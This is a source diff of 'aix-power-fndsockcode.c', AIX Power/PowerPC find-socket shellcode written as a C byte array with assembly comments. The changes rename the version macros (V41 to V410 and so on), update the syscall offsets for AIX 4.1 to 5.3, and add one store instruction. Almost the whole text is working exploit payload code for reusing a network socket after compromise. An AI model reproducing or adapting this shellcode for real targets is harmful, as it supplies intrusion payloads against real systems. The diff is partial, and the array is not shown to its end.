@@ -1,7 +1,7 @@
 /*
- *  $Id: aix-power-fndsockcode.c 6 2008-09-10 17:27:50Z ramon $
+ *  $Id: aix-power-fndsockcode.c 40 2008-11-17 02:45:30Z ramon $
  *
- *  aix-power-fndsockcode.c - AIX POWER/PowerPC Find socket code
+ *  aix-power-fndsockcode.c - AIX Power Find socket code
  *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
  *
  *  This library is free software; you can redistribute it and/or
@@ -21,18 +21,18 @@
  */
 
 /*
- * Currently supported AIX versions.
- * -DV41    AIX 4.1
- * -DV42    AIX 4.2
- * -DV43    AIX 4.3
- * -DV4330  AIX 4.3.3.0
- * -DV53    AIX 5.3
+ * Currently supported AIX levels.
+ * -DV410   AIX 4.1.0
+ * -DV420   AIX 4.2.0
+ * -DV430   AIX 4.3.0
+ * -DV433   AIX 4.3.3
+ * -DV530   AIX 5.3.0
  *
  */
 
 #define FNDSOCKPORT 106
 
-char fndsockcode[]=         /*  216 bytes                         */
+char fndsockcode[]=         /*  220 bytes                         */
     "\x7f\xff\xfa\x79"      /*  xor.    r31,r31,r31               */
     "\x40\x82\xff\xfd"      /*  bnel    <fndsockcode>             */
     "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
@@ -54,19 +54,19 @@ char fndsockcode[]=         /*  216 bytes                         */
     "\x7f\x65\xdb\x78"      /*  mr      r5,r27                    */
     "\x7f\x84\xe3\x78"      /*  mr      r4,r28                    */
     "\x7f\xe3\xfb\x78"      /*  mr      r3,r31                    */
-#ifdef V41
+#ifdef V410
     "\x38\x5d\xfe\x44"      /*  cal     r2,-444(r29)              */
 #endif
-#ifdef V42
+#ifdef V420
     "\x38\x5d\xfe\x49"      /*  cal     r2,-439(r29)              */
 #endif
-#ifdef V43
+#ifdef V430
     "\x38\x5d\xfe\x56"      /*  cal     r2,-426(r29)              */
 #endif
-#ifdef V4330
+#ifdef V433
     "\x38\x5d\xfe\x66"      /*  cal     r2,-410(r29)              */
 #endif
-#ifdef V53
+#ifdef V530
     "\x38\x5d\xfe\x7b"      /*  cal     r2,-389(r29)              */
 #endif
     "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
@@ -77,19 +77,19 @@ char fndsockcode[]=         /*  216 bytes                         */
     "\x40\x82\xff\xd4"      /*  bne     <fndsockcode+64>          */
     "\x3b\x3d\xfe\x03"      /*  cal     r25,-509(r29)             */
     "\x7f\x23\xcb\x78"      /*  mr      r3,r25                    */
-#ifdef V41
+#ifdef V410
     "\x38\x5d\xfe\x5f"      /*  cal     r2,-417(r29)              */
 #endif
-#ifdef V42
+#ifdef V420
     "\x38\x5d\xfe\x63"      /*  cal     r2,-413(r29)              */
 #endif
-#ifdef V43
+#ifdef V430
     "\x38\x5d\xfe\x72"      /*  cal     r2,-398(r29)              */
 #endif
-#ifdef V4330
+#ifdef V433
     "\x38\x5d\xfe\x83"      /*  cal     r2,-381(r29)              */
 #endif
-#ifdef V53
+#ifdef V530
     "\x38\x5d\xfe\xa1"      /*  cal     r2,-351(r29)              */
 #endif
     "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
@@ -97,19 +97,19 @@ char fndsockcode[]=         /*  216 bytes                         */
     "\x7f\x25\xcb\x78"      /*  mr      r5,r25                    */
     "\x7c\x84\x22\x78"      /*  xor     r4,r4,r4                  */
     "\x7f\xe3\xfb\x78"      /*  mr      r3,r31                    */
-#ifdef V41
+#ifdef V410
     "\x38\x5d\xfe\xd7"      /*  cal     r2,-297(r29)              */
 #endif
-#ifdef V42
+#ifdef V420
     "\x38\x5d\xfe\xe8"      /*  cal     r2,-280(r29)              */
 #endif
-#ifdef V43
+#ifdef V430
     "\x38\x5d\xfe\xfd"      /*  cal     r2,-259(r29)              */
 #endif
-#ifdef V4330
+#ifdef V433
     "\x38\x5d\xff\x10"      /*  cal     r2,-240(r29)              */
 #endif
-#ifdef V53
+#ifdef V530
     "\x38\x5d\xff\x43"      /*  cal     r2,-189(r29)              */
 #endif
     "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
@@ -120,20 +120,21 @@ char fndsockcode[]=         /*  216 bytes                         */
     "\x40\x82\xff\xfd"      /*  bnel    <fndsockcode+164>         */
     "\x7f\x08\x02\xa6"      /*  mflr    r24                       */
     "\x3b\x18\x01\xff"      /*  cal     r24,511(r24)              */
-    "\x38\x78\xfe\x25"      /*  cal     r3,-475(r24)              */
+    "\x38\x78\xfe\x29"      /*  cal     r3,-471(r24)              */
+    "\x98\xb8\xfe\x31"      /*  stb     r5,-463(r24)              */
     "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
     "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
     "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
-#if defined(V41) || defined(V4330)
+#if defined(V410) || defined(V433)
     "\x38\x5d\xfe\x04"      /*  cal     r2,-508(r29)              */
 #endif
-#ifdef V42
+#ifdef V420
     "\x38\x5d\xfe\x03"      /*  cal     r2,-509(r29)              */
 #endif
-#ifdef V43
+#ifdef V430
     "\x38\x5d\xfe\x05"      /*  cal     r2,-507(r29)              */
 #endif
-#ifdef V53
+#ifdef V530
     "\x38\x5d\xfe\x06"      /*  cal     r2,-506(r29)              */
 #endif
     "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
